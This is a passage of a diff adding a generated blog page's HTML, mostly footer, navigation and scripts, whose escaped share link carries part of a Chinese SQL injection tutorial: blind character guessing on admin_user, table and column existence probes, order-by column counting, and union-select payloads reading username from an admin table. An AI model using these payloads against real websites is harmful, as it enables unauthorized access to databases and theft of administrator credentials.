class=&#34;line&#34;&gt;and (select left(admin_user,2) from admin)=&amp;apos;ad&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select left(admin_user,3) from admin)=&amp;apos;adm&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;偏移注入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜表名： &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and exists (select * from 你要猜得表名)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查看是否存在表名 （存在的情况下页面刷新正常，同理猜字段一样的 结果存在admin）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜列名的字段名： &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and exists (select 你要猜的字段名 from 你已经才出来的表名)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查看是否存在字段名（结果存在username和password）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;order by n 直到返回不正常，那么返回的列数就是n-1。n用二分法取。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;得出显位的数字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;union select 1,2,3,4,5,...,n-1 from admin &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;用显位猜解出字段内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;union select 1,2,username,4,5,...,n-1 from admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
